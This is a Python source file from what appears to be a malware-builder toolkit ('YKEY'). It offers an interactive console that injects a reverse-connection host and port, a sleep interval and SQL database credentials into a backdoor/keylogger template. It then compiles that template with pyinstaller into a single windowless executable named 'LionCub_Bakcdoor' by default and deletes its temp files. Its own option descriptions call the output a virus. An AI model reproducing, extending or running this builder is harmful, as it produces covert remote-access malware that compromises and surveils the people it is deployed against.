from libs.colors import COLORS
from subprocess import check_output, CalledProcessError, call
from os import devnull
from terminaltables import AsciiTable
from mysql.connector import connect
from socket import socket, AF_INET, SOCK_DGRAM


devnull = open(devnull, 'w')
colors = COLORS()

global program_path
global activated_option


def execfile_y(file_name, globals_variables):
    exec(compile(open(file_name, "rb").read(), file_name, 'exec'), globals_variables)



def read_credential_file(program_path):
    credentials = {}
    with open(program_path + '/data/database_credentials.txt', 'r') as credential_file:
        while True:
            content_line = credential_file.readline()
            if not content_line:
                break

            if content_line[-1] == '\n':
                content_line = content_line[:-1]

            if len(content_line) > 0:
                key, content = content_line.split('=')
                credentials[key] = content

    return credentials


def print_generation_options(inputs_dict):

    descriptions = {
        'PNAME':'This is the name of the final executable',
        'PID': 'This is the program ID of the virus',
        'SLEEP': 'Number of seconds it sleeps during work',
        'LPORT': 'This is the reverse connection port',
        'D_HOST': 'Whether server IP is dynamic or not (True/False)',
        'LHOST': 'This is the reverse connection IP address if Dhost false',
        'UNAME': 'This is the User name of SQL database',
        'PASSWD': 'This is the Password of SQL database',
        'DATABASE': 'This is the Database name of SQL database',
        'SERVER' : 'This is the Host name of SQL database',
        'PORT': 'This is the Port of SQL database'
    }

    print(colors.RESET, end='')
    table_data = [[f'{colors.BOLD}Option', f'{colors.BOLD}Current Setting', f'{colors.BOLD}Description{colors.RESET}']]
    for item in inputs_dict:
        try:
            single_data = [str(item), str(inputs_dict[item]), descriptions[item]]
            table_data.append(single_data)
        except KeyError:
            pass

    table = AsciiTable(table_data)
    print(table.table, end='\n\n')


def generate_keylogger(inputs_dict):
    global program_path
    print(colors.Yellow + '[!]Checking the configuration of source folders')
    try:
        global devnull
        check_output('mkdir sources', shell=True, stderr=devnull)
        print(colors.Yellow + '[!]Sources folder did not found' + colors.RESET)
        print(colors.Green + '[✔]Sources folder created' + colors.RESET)
    except CalledProcessError:
        print(colors.Green + '[✔]Sources Folder found already created' + colors.RESET)

    # activating virtual environment
    print(colors.Yellow + '[!]Trying to access the virtual environment for the program' + colors.RESET)

    try:
        venv_file_path = program_path + '/venv/bin/activate_this.py'
        execfile_y(venv_file_path, dict(__file__=venv_file_path))
        print(colors.Green + '[✔]Virtual Environment Activated!!')


        with open(program_path + '/libs/backdoor/main_client.py' , 'r') as logger_base_source:
            content = logger_base_source.read()
        print(colors.Green + '[✔]Base File read successful')

        content = content.replace("'**p_id**'", inputs_dict['PID'])
        content = content.replace("'**sleep**'", inputs_dict['SLEEP'])
        content = content.replace("'**lport**'", inputs_dict['LPORT'])
        content = content.replace("'**dhost**'", inputs_dict['D_HOST'])
        content = content.replace('**lhost**', inputs_dict['LHOST'])
        content = content.replace('**uname**', inputs_dict['UNAME'])
        content = content.replace('**dbname**', inputs_dict['DATABASE'])
        content = content.replace('**passwd**', inputs_dict['PASSWD'])
        content = content.replace('**server**', inputs_dict['SERVER'])
        content = content.replace("'**port**'", inputs_dict['PORT'])    

        with open(program_path + '/sources/{}.py'.format(inputs_dict['PNAME']), 'w') as output_logger:
            output_logger.write(content)
        print(colors.Green + '[✔]Source File writing successful')

        with open(program_path + '/{}.py'.format(inputs_dict['PNAME']), 'w') as output_logger:
            output_logger.write(content)
        print(colors.Green + '[✔]Source File coppied to working directory')

        print(colors.Yellow + '[!]Creating Executables.. this may take some time....')
        check_output('pyinstaller {}.py --onefile --noconsole'.format(inputs_dict['PNAME']), shell=True, stderr=devnull)
        print(colors.Green + '[✔]Executables created success fully')
        print(colors.Green + '[✔]Your files have been saved to {}Dist{} {}dirrectory'.format(colors.BOLD, colors.RESET, colors.Green))

        print(colors.Yellow + '[!]Removing temp files......')
        try:
            name = program_path + '/' + inputs_dict['PNAME']
            check_output("rm '{}'.py".format(name), shell=True)
            check_output("rm '{}'.spec".format(name), shell=True)
            check_output("rm -R '{}/'build".format(program_path), shell=True)
            check_output("rm -R '{}/'__pycache__".format(program_path), shell=True)
        except:
            print(colors.Red + '[✘]Erroro occured while deleting the files')
        
        print(colors.Green + '[✔]Generation successful\n' + colors.RESET)


    except Exception as error:
        print(colors.Red + '[✘]Erroro occured while activating the virtual environment')
        print(colors.Red + '[✘]Error --> ' + str(error))
        print(colors.Yellow + 'Please re install the YKEY program to get rid of this error')
        exit(0)


def update_setting(setting, new_value, save_values):
    save_values[setting] = new_value
    return save_values


def activate_generation(program_path):
    database_credentials = read_credential_file(program_path)

    s = socket(AF_INET, SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    private_ip = s.getsockname()[0]
    s.close()

    saved_inputs_dict = {
        'PNAME':'LionCub_Bakcdoor',
        'PID': '1',
        'SLEEP': '900',
        'LPORT': '4343',
        'D_HOST': 'True',
        'LHOST': str(private_ip),
        'UNAME': database_credentials['Username'],
        'PASSWD': database_credentials['Password'],
        'DATABASE': database_credentials['Database'],
        'SERVER' : database_credentials['Server'],
        'PORT': database_credentials['Port']
    }

    # from here it will do the command and request thing
    global activated_option
    while True:
        # get the command from the user
        command = input("".join(activated_option) + ' > ')

        # if the command is show options then show options
        if command == 'show options' or command == 'options':
            print_generation_options(saved_inputs_dict)
        
        # if the command is generate then generate the key logger
        elif command == 'generate':
            generate_keylogger(saved_inputs_dict)
        
        # if clear clear the screen
        elif command == 'clear':
            call('clear', shell=True)

        # if the command is help print help
        elif command == 'help':
            logo_printer.print_help()

        # if the command id exit then break the loop
        elif command == 'exit' or command == 'quit':
            activated_option.remove(' {}generate({}Backdoor{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            break

        elif command == '' or command == ' ':
            pass

        # if the command is set then update the settings wales
        elif command.split()[0] == 'set':
            setting = command.split()[1]
            new_value = command.split()[2]
            saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)

        # if the command is non of above it is a unreconised command
        else:
            print(colors.Red + '[✘]Invalid command' + colors.RESET)


activate_generation(program_path)